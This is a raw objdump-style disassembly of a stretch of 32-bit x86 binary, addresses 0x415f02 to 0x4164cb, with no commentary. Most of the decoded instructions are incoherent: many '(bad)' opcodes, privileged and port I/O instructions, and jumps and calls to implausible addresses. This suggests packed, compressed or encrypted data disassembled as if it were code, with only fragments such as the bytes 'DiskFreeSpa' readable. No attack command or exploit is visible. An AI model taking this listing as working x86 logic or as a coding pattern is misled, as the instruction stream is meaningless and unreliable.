  415f02:	8b 43 0c             	mov    0xc(%ebx),%eax
  415f05:	50                   	push   %eax
  415f06:	50                   	push   %eax
  415f07:	3e 04 3d             	ds add $0x3d,%al
  415f0a:	7d f0                	jge    0x415efc
  415f0c:	48                   	dec    %eax
  415f0d:	85 b3 60 78 c5 60    	test   %esi,0x60c57860(%ebx)
  415f13:	46                   	inc    %esi
  415f14:	db 8d c6 0d b8 ee    	fisttpl -0x1147f23a(%ebp)
  415f1a:	60                   	pusha
  415f1b:	5f                   	pop    %edi
  415f1c:	0f 84 f3 00 32 83    	je     0x83736015
  415f22:	fe                   	(bad)
  415f23:	16                   	push   %ss
  415f24:	88 35 23 fe 8d 8a    	mov    %dh,0x8a8dfe23
  415f2a:	cc                   	int3
  415f2b:	db 17                	fistl  (%edi)
  415f2d:	ec                   	in     (%dx),%al
  415f2e:	93                   	xchg   %eax,%ebx
  415f2f:	0f 3d                	(bad)
  415f31:	05 26 28 8b 15       	add    $0x158b2826,%eax
  415f36:	b2 63                	mov    $0x63,%dl
  415f38:	83 ed 8a             	sub    $0xffffff8a,%ebp
  415f3b:	0d b4 8b bd c0       	or     $0xc0bd8bb4,%eax
  415f40:	39 c4                	cmp    %eax,%esp
  415f42:	67 64 73 34          	addr16 fs jae 0x415f7a
  415f46:	0b 39                	or     (%ecx),%edi
  415f48:	0f c8                	bswap  %eax
  415f4a:	cc                   	int3
  415f4b:	a8 de                	test   $0xde,%al
  415f4d:	64 ec                	fs in  (%dx),%al
  415f4f:	89 b5 d0 56 d4 63    	mov    %esi,0x63d456d0(%ebp)
  415f55:	de 64 bf 56          	fisubs 0x56(%edi,%edi,4)
  415f59:	7e 43                	jle    0x415f9e
  415f5b:	f0 a1 d8 bb 8d 0f    	lock mov 0xf8dbbd8,%eax
  415f61:	6c                   	insb   (%dx),%es:(%edi)
  415f62:	ec                   	in     (%dx),%al
  415f63:	24 3b                	and    $0x3b,%al
  415f65:	47                   	inc    %edi
  415f66:	ac                   	lods   %ds:(%esi),%al
  415f67:	66 eb 5a             	data16 jmp 0x415fc4
  415f6a:	95                   	xchg   %eax,%ebp
  415f6b:	94                   	xchg   %eax,%esp
  415f6c:	3e 27                	ds daa
  415f6e:	23 63 67             	and    0x67(%ebx),%esp
  415f71:	98                   	cwtl
  415f72:	5b                   	pop    %ebx
  415f73:	9c                   	pushf
  415f74:	a0 a4 2c 23 27       	mov    0x27232ca4,%al
  415f79:	23 a8 94 02 90 8c    	and    -0x736ffd6c(%eax),%ebp
  415f7f:	94                   	xchg   %eax,%esp
  415f80:	5c                   	pop    %esp
  415f81:	f2 f8                	repnz clc
  415f83:	90                   	nop
  415f84:	a3 98 11 c1 9c       	mov    %eax,0x9cc11198
  415f89:	ca 82 89             	lret   $0x8982
  415f8c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  415f8d:	46                   	inc    %esi
  415f8e:	ac                   	lods   %ds:(%esi),%al
  415f8f:	07                   	pop    %es
  415f90:	44                   	inc    %esp
  415f91:	88 bb 62 b6 41 08    	mov    %bh,0x841b662(%ebx)
  415f97:	28 43 d5             	sub    %al,-0x2b(%ebx)
  415f9a:	c7                   	(bad)
  415f9b:	d1 8a 09 01 af bc    	rorl   $1,-0x4350fef7(%edx)
  415fa1:	70 c9                	jo     0x415f6c
  415fa3:	41                   	inc    %ecx
  415fa4:	68 87 b2 8f 83       	push   $0x838fb287
  415fa9:	fc                   	cld
  415faa:	35 5e fa 80 ff       	xor    $0xff80fa5e,%eax
  415faf:	d0 83 c2 fd ca 08    	rolb   $1,0x8cafdc2(%ebx)
  415fb5:	72 08                	jb     0x415fbf
  415fb7:	3c ed                	cmp    $0xed,%al
  415fb9:	02 48 37             	add    0x37(%eax),%cl
  415fbc:	d2 0a                	rorb   %cl,(%edx)
  415fbe:	73 22                	jae    0x415fe2
  415fc0:	c2 ee 3b             	ret    $0x3bee
  415fc3:	55                   	push   %ebp
  415fc4:	17                   	pop    %ss
  415fc5:	f5                   	cmc
  415fc6:	c0 dd 09             	rcr    $0x9,%ch
  415fc9:	71 04                	jno    0x415fcf
  415fcb:	59                   	pop    %ecx
  415fcc:	0a cf                	or     %bh,%cl
  415fce:	b8 2c 38 18 24       	mov    $0x2418382c,%eax
  415fd3:	73 f4                	jae    0x415fc9
  415fd5:	5e                   	pop    %esi
  415fd6:	ea f0 49 76 93 b4 f3 	ljmp   $0xf3b4,$0x937649f0
  415fdd:	73 f0                	jae    0x415fcf
  415fdf:	cf                   	iret
  415fe0:	1c 62                	sbb    $0x62,%al
  415fe2:	c0 25 97 68 97 cd c4 	shlb   $0xc4,0xcd976897
  415fe9:	61                   	popa
  415fea:	06                   	push   %es
  415feb:	cf                   	iret
  415fec:	c9                   	leave
  415fed:	20 42 ed             	and    %al,-0x13(%edx)
  415ff0:	04 96                	add    $0x96,%al
  415ff2:	83 f0 be             	xor    $0xffffffbe,%eax
  415ff5:	61                   	popa
  415ff6:	75 21                	jne    0x416019
  415ff8:	c3                   	ret
  415ff9:	3b 81 78 05 81 df    	cmp    -0x207efa88(%ecx),%eax
  415fff:	23 39                	and    (%ecx),%edi
  416001:	20 e0                	and    %ah,%al
  416003:	c3                   	ret
  416004:	c3                   	ret
  416005:	97                   	xchg   %eax,%edi
  416006:	7d 0c                	jge    0x416014
  416008:	f9                   	stc
  416009:	d3 71 84             	shll   %cl,-0x7c(%ecx)
  41600c:	6b e8 80             	imul   $0xffffff80,%eax,%ebp
  41600f:	fc                   	cld
  416010:	b7 d7                	mov    $0xd7,%bh
  416012:	21 5d fd             	and    %ebx,-0x3(%ebp)
  416015:	10 a3 a1 20 f8 a1    	adc    %ah,-0x5e07df5f(%ebx)
  41601b:	39 64 33 c9          	cmp    %esp,-0x37(%ebx,%esi,1)
  41601f:	94                   	xchg   %eax,%esp
  416020:	f4                   	hlt
  416021:	f8                   	clc
  416022:	98                   	cwtl
  416023:	65 f8                	gs clc
  416025:	66 60                	pushaw
  416027:	29 b7 a1 b8 3e 91    	sub    %esi,-0x6ec1475f(%edi)
  41602d:	2c 01                	sub    $0x1,%al
  41602f:	bb 66 e1 9a df       	mov    $0xdf9ae166,%ebx
  416034:	f4                   	hlt
  416035:	0a a0 83 dc 15 8b    	or     -0x74ea237d(%eax),%ah
  41603b:	1c 6b                	sbb    $0x6b,%al
  41603d:	8e dd                	mov    %ebp,%ds
  41603f:	a8 a1                	test   $0xa1,%al
  416041:	14 17                	adc    $0x17,%al
  416043:	f4                   	hlt
  416044:	80 20 0a             	andb   $0xa,(%eax)
  416047:	d4 82                	aam    $0x82
  416049:	98                   	cwtl
  41604a:	ef                   	out    %eax,(%dx)
  41604b:	33 d6                	xor    %esi,%edx
  41604d:	a8 15                	test   $0x15,%al
  41604f:	2c ac                	sub    $0xac,%al
  416051:	f3 0a 48 55          	repz or 0x55(%eax),%cl
  416055:	08 39                	or     %bh,(%ecx)
  416057:	19 18                	sbb    %ebx,(%eax)
  416059:	78 84                	js     0x415fdf
  41605b:	88 7d 04             	mov    %bh,0x4(%ebp)
  41605e:	0c ed                	or     $0xed,%al
  416060:	3c c6                	cmp    $0xc6,%al
  416062:	40                   	inc    %eax
  416063:	0c 01                	or     $0x1,%al
  416065:	08 03                	or     %al,(%ebx)
  416067:	b1 f6                	mov    $0xf6,%cl
  416069:	a2 29 38 af 4f       	mov    %al,0x4faf3829
  41606e:	cc                   	int3
  41606f:	70 78                	jo     0x4160e9
  416071:	b3 19                	mov    $0x19,%bl
  416073:	08 39                	or     %bh,(%ecx)
  416075:	2f                   	das
  416076:	a8 67                	test   $0x67,%al
  416078:	cf                   	iret
  416079:	55                   	push   %ebp
  41607a:	b4 49                	mov    $0x49,%ah
  41607c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  41607d:	08 dc                	or     %bl,%ah
  41607f:	1c 76                	sbb    $0x76,%al
  416081:	c8 61 11 14          	enter  $0x1161,$0x14
  416085:	20 08                	and    %cl,(%eax)
  416087:	a8 54                	test   $0x54,%al
  416089:	2e 95                	cs xchg %eax,%ebp
  41608b:	82 f3 dc             	xor    $0xdc,%bl
  41608e:	6c                   	insb   (%dx),%es:(%edi)
  41608f:	ff 85 ca 51 5b 20    	incl   0x205b51ca(%ebp)
  416095:	94                   	xchg   %eax,%esp
  416096:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  416097:	3c 4c                	cmp    $0x4c,%al
  416099:	ed                   	in     (%dx),%eax
  41609a:	80 9a 4c 37 41 a3 bc 	sbbb   $0xbc,-0x5cbec8b4(%edx)
  4160a1:	72 e2                	jb     0x416085
  4160a3:	93                   	xchg   %eax,%ebx
  4160a4:	4f                   	dec    %edi
  4160a5:	ee                   	out    %al,(%dx)
  4160a6:	08 04 a3             	or     %al,(%ebx,%eiz,4)
  4160a9:	c0 08 a3             	rorb   $0xa3,(%eax)
  4160ac:	c4 0c a3             	les    (%ebx,%eiz,4),%ecx
  4160af:	c8 d1 2d 96          	enter  $0x2dd1,$0x96
  4160b3:	86 ad cc 8d 8d 14    	xchg   %ch,0x148d8dcc(%ebp)
  4160b9:	b9 0e af 45 72       	mov    $0x7245af0e,%ecx
  4160be:	c6                   	(bad)
  4160bf:	6d                   	insl   (%dx),%es:(%edi)
  4160c0:	4d                   	dec    %ebp
  4160c1:	46                   	inc    %esi
  4160c2:	9f                   	lahf
  4160c3:	ba b8 6b af 6d       	mov    $0x6daf6bb8,%edx
  4160c8:	61                   	popa
  4160c9:	4a                   	dec    %edx
  4160ca:	66 80 3c b5 60 09 a9 	data16 cmpb $0xa0,-0x4856f6a0(,%esi,4)
  4160d1:	b7 a0 
  4160d3:	a8 14                	test   $0x14,%al
  4160d5:	8a 00                	mov    (%eax),%al
  4160d7:	cc                   	int3
  4160d8:	83 0b 50             	orl    $0x50,(%ebx)
  4160db:	85 4c 6d 40          	test   %ecx,0x40(%ebp,%ebp,2)
  4160df:	f7 4e b0 fe 73 f6 7f 	testl  $0x7ff673fe,-0x50(%esi)
  4160e6:	4e                   	dec    %esi
  4160e7:	85 f6                	test   %esi,%esi
  4160e9:	7c 12                	jl     0x4160fd
  4160eb:	8a 0c 30             	mov    (%eax,%esi,1),%cl
  4160ee:	81 e1 1f 0d 72 e9    	and    $0xe9720d1f,%ecx
  4160f4:	8b cf                	mov    %edi,%ecx
  4160f6:	2b ce                	sub    %esi,%ecx
  4160f8:	d4 df                	aam    $0xdf
  4160fa:	00 d0                	add    %dl,%al
  4160fc:	12 8d 79 05 49 83    	adc    -0x7cb6fa87(%ebp),%cl
  416102:	c9                   	leave
  416103:	fe 41 99             	incb   -0x67(%ecx)
  416106:	b0 ff                	mov    $0xff,%al
  416108:	52                   	push   %edx
  416109:	02 04 b2             	add    (%edx,%esi,4),%al
  41610c:	02 eb                	add    %bl,%ch
  41610e:	13 8a 04 38 49 02    	adc    0x2493804(%edx),%ecx
  416114:	06                   	push   %es
  416115:	2f                   	das
  416116:	1c 74                	sbb    $0x74,%al
  416118:	8b c2                	mov    %edx,%eax
  41611a:	ff c3                	inc    %ebx
  41611c:	36 a2 06 0f 78 80    	mov    %al,%ss:0x80780f06
  416122:	3d 46 91 41 f0       	cmp    $0xf0419146,%eax
  416127:	d1 c1                	rol    $1,%ecx
  416129:	4f                   	dec    %edi
  41612a:	d6                   	salc
  41612b:	4a                   	dec    %edx
  41612c:	60                   	pusha
  41612d:	3c 04                	cmp    $0x4,%al
  41612f:	c5 0e                	lds    (%esi),%ecx
  416131:	db 2b                	fldt   (%ebx)
  416133:	33 c9                	xor    %ecx,%ecx
  416135:	1d 07 13 e2 18       	sbb    $0x18e21307,%eax
  41613a:	0c b6                	or     $0xb6,%al
  41613c:	27                   	daa
  41613d:	c1 3b da             	sarl   $0xda,(%ebx)
  416140:	5b                   	pop    %ebx
  416141:	76 18                	jbe    0x41615b
  416143:	b5 17                	mov    $0x17,%ch
  416145:	35 51 46 9f 12       	xor    $0x129f4651,%eax
  41614a:	6d                   	insl   (%dx),%es:(%edi)
  41614b:	60                   	pusha
  41614c:	a1 9e 22 82 13       	mov    0x1382229e,%eax
  416151:	b7 c6                	mov    $0xc6,%bh
  416153:	6b 9c 2d 3a 15 1b 94 	imul   $0xffffffc6,-0x6be4eac6(%ebp,%ebp,1),%ebx
  41615a:	c6 
  41615b:	50                   	push   %eax
  41615c:	01 2a                	add    %ebp,(%edx)
  41615e:	11 a1 bf 81 cf 20    	adc    %esp,0x20cf81bf(%ecx)
  416164:	47                   	inc    %edi
  416165:	f8                   	clc
  416166:	58                   	pop    %eax
  416167:	2c 01                	sub    $0x1,%al
  416169:	72 ba                	jb     0x416125
  41616b:	e8 24 dd 5b a7       	call   0xa79d3e94
  416170:	01 47 47             	add    %eax,0x47(%edi)
  416173:	23 c7                	and    %edi,%eax
  416175:	75 dc                	jne    0x416153
  416177:	85 df                	test   %ebx,%edi
  416179:	01 a1 fb e8 bf bb    	add    %esp,-0x44401705(%ecx)
  41617f:	8d 6c 5f a8          	lea    -0x58(%edi,%ebx,2),%ebp
  416183:	26 36 c0 be a8 f6 06 	es sarb $0x4b,%ss:0x906f6a8(%esi)
  41618a:	09 4b 
  41618c:	66 cd 43             	data16 int $0x43
  41618f:	fb                   	sti
  416190:	b6 df                	mov    $0xdf,%dh
  416192:	09 05 06 f6 8c d8    	or     %eax,0xd88cf606
  416198:	02 5a ea             	add    -0x16(%edx),%bl
  41619b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  41619c:	ee                   	out    %al,(%dx)
  41619d:	89 06                	mov    %eax,(%esi)
  41619f:	66 06                	pushw  %es
  4161a1:	15 94 66 81 e2       	adc    $0xe2816694,%eax
  4161a6:	ec                   	in     (%dx),%al
  4161a7:	66 dc da             	data16 (bad)
  4161aa:	5f                   	pop    %edi
  4161ab:	8a 69 0f             	mov    0xf(%ecx),%ch
  4161ae:	b7 c0                	mov    $0xc0,%bh
  4161b0:	c1 e8 0a             	shr    $0xa,%eax
  4161b3:	09 26                	or     %esp,(%esi)
  4161b5:	6a 4a                	push   $0x4a
  4161b7:	d9 2f                	fldcw  (%edi)
  4161b9:	54                   	push   %esp
  4161ba:	d9 4d 38             	(bad) 0x38(%ebp)
  4161bd:	4d                   	dec    %ebp
  4161be:	88 46 09             	mov    %al,0x9(%esi)
  4161c1:	6a 2a                	push   $0x2a
  4161c3:	0e                   	push   %cs
  4161c4:	ea c7 ee 3e c3 88 5e 	ljmp   $0x5e88,$0xc33eeec7
  4161cb:	08 c4                	or     %al,%ah
  4161cd:	40                   	inc    %eax
  4161ce:	55                   	push   %ebp
  4161cf:	6a 49                	push   $0x49
  4161d1:	98                   	cwtl
  4161d2:	33 f6                	xor    %esi,%esi
  4161d4:	eb 25                	jmp    0x4161fb
  4161d6:	16                   	push   %ss
  4161d7:	0a ff                	or     %bh,%bh
  4161d9:	df a6 35 06 8a 5c    	fbld   0x5c8a0635(%esi)
  4161df:	35 07 2a d8 72       	xor    $0x72d82a07,%eax
  4161e4:	16                   	push   %ss
  4161e5:	43                   	inc    %ebx
  4161e6:	88 f4                	mov    %dh,%ah
  4161e8:	48                   	dec    %eax
  4161e9:	24 0a                	and    $0xa,%al
  4161eb:	fa                   	cli
  4161ec:	b7 4f                	mov    $0x4f,%bh
  4161ee:	ab                   	stos   %eax,%es:(%edi)
  4161ef:	07                   	pop    %es
  4161f0:	fe 0a                	decb   (%edx)
  4161f2:	fe cb                	dec    %bl
  4161f4:	75 ee                	jne    0x4161e4
  4161f6:	83 c6 02             	add    $0x2,%esi
  4161f9:	06                   	push   %es
  4161fa:	ed                   	in     (%dx),%eax
  4161fb:	f2 6b e7 0a          	repnz imul $0xa,%edi,%esp
  4161ff:	29 0a                	sub    %ecx,(%edx)
  416201:	44                   	inc    %esp
  416202:	75 cc                	jne    0x4161d0
  416204:	a9 ca 4f 27 26       	test   $0x26274fca,%eax
  416209:	a1 27 b9 fb 68       	mov    0x68fbb927,%eax
  41620e:	49                   	dec    %ecx
  41620f:	e0 25                	loopne 0x416236
  416211:	bb e0 75 f9 53       	mov    $0x53f975e0,%ebx
  416216:	d5 df                	aad    $0xdf
  416218:	89 76 58             	mov    %esi,0x58(%esi)
  41621b:	d8 e6                	fsub   %st(6),%st
  41621d:	10 ba 1a 3c 5d 05    	adc    %bh,0x55d3c1a(%edx)
  416223:	68 14 c6 d4 85       	push   $0x85d4c614
  416228:	0f 82 95 50 78 ba    	jb     0xbab9b2c3
  41622e:	14 6e                	adc    $0x6e,%al
  416230:	39 60 42             	cmp    %esp,0x42(%eax)
  416233:	ec                   	in     (%dx),%al
  416234:	58                   	pop    %eax
  416235:	1e                   	push   %ds
  416236:	b8 e8 fb 82 43       	mov    $0x4382fbe8,%eax
  41623b:	8f                   	(bad)
  41623c:	a1 32 8a f4 4c       	mov    0x4cf48a32,%eax
  416241:	49                   	dec    %ecx
  416242:	d0 02                	rolb   $1,(%edx)
  416244:	b6 ba                	mov    $0xba,%dh
  416246:	1b 21                	sbb    (%ecx),%esp
  416248:	14 ab                	adc    $0xab,%al
  41624a:	20 83 6c ee a2 ec    	and    %al,-0x135d1194(%ebx)
  416250:	28 23                	sub    %ah,(%ebx)
  416252:	e8 1c dd 45 1c       	call   0x1c873f73
  416257:	72 e8                	jb     0x416241
  416259:	ed                   	in     (%dx),%eax
  41625a:	1f                   	pop    %ds
  41625b:	2c ba                	sub    $0xba,%al
  41625d:	0f                   	prefetchw (bad)
  41625e:	0d c8 df 93 1c       	or     $0x1c93dfc8,%eax
  416263:	d8 a2 ee 12 2e ba    	fsubs  -0x45d1ed12(%edx)
  416269:	0e                   	push   %cs
  41626a:	ef                   	out    %eax,(%dx)
  41626b:	72 20                	jb     0x41628d
  41626d:	83 8c 49 e4 19 e4 c8 	orl    $0xffffff80,-0x371be61c(%ecx,%ecx,2)
  416274:	80 
  416275:	fc                   	cld
  416276:	1d f0 36 2f ba       	sbb    $0xba2f36f0,%eax
  41627b:	1d f1 e2 40 9a       	sbb    $0x9a40e2f1,%eax
  416280:	cb                   	lret
  416281:	dc 00                	faddl  (%eax)
  416283:	8a 1f                	mov    (%edi),%bl
  416285:	dc 76 c9             	fdivl  -0x37(%esi)
  416288:	db e7                	(bad)
  41628a:	5c                   	pop    %esp
  41628b:	ea c4 d1 e0 b8 f4 d4 	ljmp   $0xd4f4,$0xb8e0d1c4
  416292:	2c c8                	sub    $0xc8,%al
  416294:	72 20                	jb     0x4162b6
  416296:	cf                   	iret
  416297:	10 20                	adc    %ah,(%eax)
  416299:	d4 d8                	aam    $0xd8
  41629b:	06                   	push   %es
  41629c:	ec                   	in     (%dx),%al
  41629d:	87 3c d8             	xchg   %edi,(%eax,%ebx,8)
  4162a0:	b8 f8 b1 3a ba       	mov    $0xba3ab1f8,%eax
  4162a5:	1e                   	push   %ds
  4162a6:	6c                   	insb   (%dx),%es:(%edi)
  4162a7:	fc                   	cld
  4162a8:	03 e1                	add    %ecx,%esp
  4162aa:	d9 46 d0             	flds   -0x30(%esi)
  4162ad:	3f                   	aas
  4162ae:	28 28                	sub    %ch,(%eax)
  4162b0:	33 c8                	xor    %eax,%ecx
  4162b2:	b3 4d                	mov    $0x4d,%bl
  4162b4:	f2 d0 b8 00 05 cc 21 	repnz sarb $1,0x21cc0500(%eax)
  4162bb:	34 29                	xor    $0x29,%al
  4162bd:	83 c5 25             	add    $0x25,%ebp
  4162c0:	1f                   	pop    %ds
  4162c1:	cc                   	int3
  4162c2:	b8 04 f8 ca f4       	mov    $0xf4caf804,%eax
  4162c7:	07                   	pop    %es
  4162c8:	32 d8                	xor    %al,%bl
  4162ca:	60                   	pusha
  4162cb:	07                   	pop    %es
  4162cc:	c8 f7 25 c8          	enter  $0x25f7,$0xc8
  4162d0:	db c1                	fcmovnb %st(1),%st
  4162d2:	03 26                	add    (%esi),%esp
  4162d4:	d8 3e                	fdivrs (%esi)
  4162d6:	ba 40 53 0d e9       	mov    $0xe90d5340,%edx
  4162db:	86 90 62 0e 4c c9    	xchg   %dl,-0x36b3f19e(%eax)
  4162e1:	81 0c b2 3e c4 23 c4 	orl    $0xc423c43e,(%edx,%esi,4)
  4162e8:	01 39                	add    %edi,(%ecx)
  4162ea:	c8 76 3f 61          	enter  $0x3f76,$0x61
  4162ee:	c0 05 10 f9 40 9e 90 	rolb   $0x90,0x9e40f910
  4162f5:	c0 f4 ba             	shl    $0xba,%ah
  4162f8:	58                   	pop    %eax
  4162f9:	f8                   	clc
  4162fa:	ba 68 2b b0 2d       	mov    $0x2db02b68,%edx
  4162ff:	0d 23 f8 02 fc       	or     $0xfc02f823,%eax
  416304:	1e                   	push   %ds
  416305:	0f 07                	sysret
  416307:	09 dc                	or     %ebx,%esp
  416309:	9b                   	fwait
  41630a:	07                   	pop    %es
  41630b:	f4                   	hlt
  41630c:	b8 08 c8 0a 27       	mov    $0x270ac808,%eax
  416311:	14 12                	adc    $0x12,%al
  416313:	32 c8                	xor    %al,%cl
  416315:	60                   	pusha
  416316:	1c 84                	sbb    $0x84,%al
  416318:	0c 02                	or     $0x2,%al
  41631a:	6e                   	outsb  %ds:(%esi),(%dx)
  41631b:	40                   	inc    %eax
  41631c:	1a f8                	sbb    %al,%bh
  41631e:	0c ec                	or     $0xec,%al
  416320:	1c 6d                	sbb    $0x6d,%al
  416322:	c1 48 7e 4e          	rorl   $0x4e,0x7e(%eax)
  416326:	e6 89                	out    %al,$0x89
  416328:	c0 ba 10 24 38 24 88 	sarb   $0x88,0x24382410(%edx)
  41632f:	4d                   	dec    %ebp
  416330:	0f 30                	wrmsr
  416332:	3b 2f                	cmp    (%edi),%ebp
  416334:	48                   	dec    %eax
  416335:	f0 e5 06             	lock in $0x6,%eax
  416338:	6d                   	insl   (%dx),%es:(%edi)
  416339:	2f                   	das
  41633a:	64 2f                	fs das
  41633c:	37                   	aaa
  41633d:	57                   	push   %edi
  41633e:	20 20                	and    %ah,(%eax)
  416340:	c1 bb 6d 00 20 64 2c 	sarl   $0x2c,0x6420006d(%ebx)
  416347:	20 63 be             	and    %ah,-0x42(%ebx)
  41634a:	20 97 7d bc 61 6d    	and    %dl,0x6d61bc7d(%edi)
  416350:	0b 70 4b             	or     0x4b(%eax),%esi
  416353:	68 7f 6a 72 c0       	push   $0xc0726a7f
  416358:	23 68 68             	and    0x68(%eax),%ebp
  41635b:	e7 20                	out    %eax,$0x20
  41635d:	41                   	inc    %ecx
  41635e:	4d                   	dec    %ebp
  41635f:	50                   	push   %eax
  416360:	09 1e                	or     %ebx,(%esi)
  416362:	6f                   	outsl  %ds:(%esi),(%dx)
  416363:	d9 4d 00             	(bad) 0x0(%ebp)
  416366:	0f 0e                	femms
  416368:	1f                   	pop    %ds
  416369:	c7                   	(bad)
  41636a:	ba 4b d6 06 3a       	mov    $0x3a06d64b,%edx
  41636f:	66 83 0b 3a          	orw    $0x3a,(%ebx)
  416373:	73 73                	jae    0x4163e8
  416375:	06                   	push   %es
  416376:	81 e9 ac 9b ec 6e    	sub    $0x6eec9bac,%ecx
  41637c:	1e                   	push   %ds
  41637d:	c0 80 ec 8a 49 16 8b 	rolb   $0x8b,0x16498aec(%eax)
  416384:	b0 28                	mov    $0x28,%al
  416386:	6c                   	insb   (%dx),%es:(%edi)
  416387:	d4 13                	aam    $0x13
  416389:	90                   	nop
  41638a:	35 6b c6 58 12       	xor    $0x1258c66b,%eax
  41638f:	98                   	cwtl
  416390:	93                   	xchg   %eax,%ebx
  416391:	3a d1                	cmp    %cl,%dl
  416393:	ec                   	in     (%dx),%al
  416394:	3c 40                	cmp    $0x40,%al
  416396:	68 6c f4 2b b6       	push   $0xb62bf46c
  41639b:	13 fc                	adc    %esp,%edi
  41639d:	32 6a 01             	xor    0x1(%edx),%ch
  4163a0:	79 c0                	jns    0x416362
  4163a2:	90                   	nop
  4163a3:	db 41 9e             	fildl  -0x62(%ecx)
  4163a6:	8c 69 eb             	mov    %gs,-0x15(%ecx)
  4163a9:	12 13                	adc    (%ebx),%dl
  4163ab:	10 f4                	adc    %dh,%ah
  4163ad:	38 21                	cmp    %ah,(%ecx)
  4163af:	01 9f ac 89 58 0c    	add    %ebx,0xc5889ac(%edi)
  4163b5:	cb                   	lret
  4163b6:	1d 8b 46 41 42       	sbb    $0x4241468b,%eax
  4163bb:	9e                   	sahf
  4163bc:	86 ec                	xchg   %ch,%ah
  4163be:	17                   	pop    %ss
  4163bf:	b5 5d                	mov    $0x5d,%ch
  4163c1:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4163c2:	0a 8a 1a 7a 88 74    	or     0x74887a1a(%edx),%cl
  4163c8:	a8 2e                	test   $0x2e,%al
  4163ca:	a8 77                	test   $0x77,%al
  4163cc:	d7                   	xlat   %ds:(%ebx)
  4163cd:	bb a0 f2 40 27       	mov    $0x2740f2a0,%ebx
  4163d2:	03 a0 41 08 68 54    	add    0x54680841(%eax),%esp
  4163d8:	ba 8a ac cf 6d       	mov    $0x6dcfac8a,%edx
  4163dd:	08 68 26             	or     %ch,0x26(%eax)
  4163e0:	eb 7f                	jmp    0x416461
  4163e2:	68 8c 4c b3 c1       	push   $0xc1b34c8c
  4163e7:	d7                   	xlat   %ds:(%ebx)
  4163e8:	6c                   	insb   (%dx),%es:(%edi)
  4163e9:	91                   	xchg   %eax,%ecx
  4163ea:	c8 5c 9c 53          	enter  $0x9c5c,$0x53
  4163ee:	10 d0                	adc    %dl,%al
  4163f0:	bc bd 2e aa de       	mov    $0xdeaa2ebd,%esp
  4163f5:	b6 3d                	mov    $0x3d,%dh
  4163f7:	05 2c 0a b8 f0       	add    $0xf0b80a2c,%eax
  4163fc:	0c 40                	or     $0x40,%al
  4163fe:	ac                   	lods   %ds:(%esi),%al
  4163ff:	00 bc 12 a8 fe bf b2 	add    %bh,-0x4d400158(%edx,%edx,1)
  416406:	02 07                	add    (%edi),%al
  416408:	44                   	inc    %esp
  416409:	69 73 6b 46 72 65 65 	imul   $0x65657246,0x6b(%ebx),%esi
  416410:	53                   	push   %ebx
  416411:	70 61                	jo     0x416474
  416413:	c0 c0 56             	rol    $0x56,%al
  416416:	ad                   	lods   %ds:(%esi),%eax
  416417:	94                   	xchg   %eax,%esp
  416418:	98                   	cwtl
  416419:	41                   	inc    %ecx
  41641a:	bb 46 36 30 10       	mov    $0x10303646,%ebx
  41641f:	bb 9e 33 d2 1a       	mov    $0x1ad2339e,%ebx
  416424:	6b 8c 0a 94 9d 52 39 	imul   $0xfffffff0,0x39529d94(%edx,%ecx,1),%ecx
  41642b:	f0 
  41642c:	b7 c1                	mov    $0xc1,%bh
  41642e:	02 63 ae             	add    -0x52(%ebx),%ah
  416431:	ff 01                	incl   (%ecx)
  416433:	81 40 3b 1c a1 c4 8b 	addl   $0x8bc4a11c,0x3b(%eax)
  41643a:	2e 94                	cs xchg %eax,%esp
  41643c:	46                   	inc    %esi
  41643d:	28 f6                	sub    %dh,%dh
  41643f:	cb                   	lret
  416440:	20 a0 01 ed 58 99    	and    %ah,-0x66a712ff(%eax)
  416446:	35 2c 42 33 37       	xor    $0x3733422c,%eax
  41644b:	ab                   	stos   %eax,%es:(%edi)
  41644c:	06                   	push   %es
  41644d:	10 9c c6 53 60 f6 02 	adc    %bl,0x2f66053(%esi,%eax,8)
  416454:	c7                   	(bad)
  416455:	ce                   	into
  416456:	6c                   	insb   (%dx),%es:(%edi)
  416457:	5e                   	pop    %esi
  416458:	7c 90                	jl     0x4163ea
  41645a:	e2 80                	loop   0x4163dc
  41645c:	e2 fc                	loop   0x41645a
  41645e:	6a 16                	push   $0x16
  416460:	09 68 6d             	or     %ebp,0x6d(%eax)
  416463:	06                   	push   %es
  416464:	54                   	push   %esp
  416465:	50                   	push   %eax
  416466:	73 82                	jae    0x4163ea
  416468:	1d bb 1d 50 49       	sbb    $0x49501dbb,%eax
  41646d:	7e 07                	jle    0x416476
  41646f:	1c 1c                	sbb    $0x1c,%al
  416471:	5c                   	pop    %esp
  416472:	3f                   	aas
  416473:	2a 16                	sub    (%esi),%dl
  416475:	b8 29 83 83 7e       	mov    $0x7e838329,%eax
  41647a:	2c 1e                	sub    $0x1e,%al
  41647c:	2a cb                	sub    %bl,%cl
  41647e:	17                   	pop    %ss
  41647f:	a0 35 de 7f b5       	mov    0xb57fde35,%al
  416484:	33 78 8b             	xor    -0x75(%eax),%edi
  416487:	d0 3b                	sarb   $1,(%ebx)
  416489:	ff 81 52 ee d3 7e    	incl   0x7ed3ee52(%ecx)
  41648f:	12 10                	adc    (%eax),%dl
  416491:	7b f4                	jnp    0x416487
  416493:	f1                   	int1
  416494:	8b 4e 28             	mov    0x28(%esi),%ecx
  416497:	3b 46 19             	cmp    0x19(%esi),%eax
  41649a:	c0 db 56             	rcr    $0x56,%bl
  41649d:	09 e9                	or     %ebp,%ecx
  41649f:	15 0f 9e c0 db       	adc    $0xdbc09e0f,%eax
  4164a4:	2d fc ac 81 45       	sub    $0x4581acfc,%eax
  4164a9:	43                   	inc    %ebx
  4164aa:	57                   	push   %edi
  4164ab:	58                   	pop    %eax
  4164ac:	80 7b 34 27          	cmpb   $0x27,0x34(%ebx)
  4164b0:	32 50 23             	xor    0x23(%eax),%dl
  4164b3:	2c f4                	sub    $0xf4,%al
  4164b5:	0a a0 34 2c f2 7c    	or     0x7cf22c34(%eax),%ah
  4164bb:	46                   	inc    %esi
  4164bc:	96                   	xchg   %eax,%esi
  4164bd:	6a 0d                	push   $0xd
  4164bf:	74 0b                	je     0x4164cc
  4164c1:	e0 4b                	loopne 0x41650e
  4164c3:	1c 20                	sbb    $0x20,%al
  4164c5:	ff 6c 6d db          	ljmp   *-0x25(%ebp,%ebp,2)
  4164c9:	08 20                	or     %ah,(%eax)
  4164cb:	1b 24 6d 04 20 2c c6 	sbb    -0x39d3dffc(,%ebp,2),%esp
